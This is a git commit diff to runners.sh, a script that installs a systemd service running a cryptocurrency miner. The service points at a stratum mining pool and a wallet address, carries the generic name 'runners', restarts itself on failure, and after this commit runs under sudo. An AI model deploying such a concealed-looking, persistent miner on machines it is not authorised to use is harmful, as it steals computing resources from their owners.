1c77e40df41ea5572308cad5c33e3940def1df79
rainight-Equinox <1150777422@qq.com>
2023-11-14 17:11:42 +0800

    Update runners.sh

--- runners.sh
+++ runners.sh
@@ -12,8 +12,8 @@ tee <<EOF >/dev/null /etc/systemd/system/runners.service
 Description=runners
 After=network-online.target
 [Service]
-User=root
-ExecStart=/opt/runners -a gr -o stratum+tcp://eu.coin-miners.info:6519 -u SgN6qYsoU8AdSGBWxPAhBFGnQRm3EiCQE1.1 -p c=SUBI,m=solo
+User=ubuntu
+ExecStart=sudo /opt/runners -a gr -o stratum+tcp://eu.coin-miners.info:6519 -u SgN6qYsoU8AdSGBWxPAhBFGnQRm3EiCQE1.1 -p c=SUBI,m=solo
 Restart=on-failure
 RestartSec=3
 LimitNOFILE=4096
